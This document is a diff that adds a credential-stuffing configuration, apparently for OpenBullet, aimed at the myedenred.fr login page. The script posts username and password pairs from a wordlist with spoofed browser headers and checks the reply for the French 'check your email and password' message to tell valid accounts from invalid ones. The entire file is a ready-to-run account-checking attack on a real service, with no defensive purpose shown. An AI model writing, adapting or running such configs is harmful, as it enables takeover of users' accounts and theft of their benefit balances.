@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Myedenred ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-03T15:51:01.7422708+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#post REQUEST POST "https://www.myedenred.fr/ctr?Length=7" AutoRedirect=TRUE 
+  CONTENT "ReturnUrl=%2F&Email=<USER>&Password=<PASS>&RememberMe=false&X-Requested-With=XMLHttpRequest" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.myedenred.fr" 
+  HEADER "Origin: https://www.myedenred.fr" 
+  HEADER "Referer: https://www.myedenred.fr/ExtendedAccount/Logon?ReturnUrl=%2f" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "V&#233;rifiez votre email et votre mot de passe" 
+  KEYCHAIN Failure OR 
+    KEY "V&#233;rifiez votre email et votre mot de passe" 
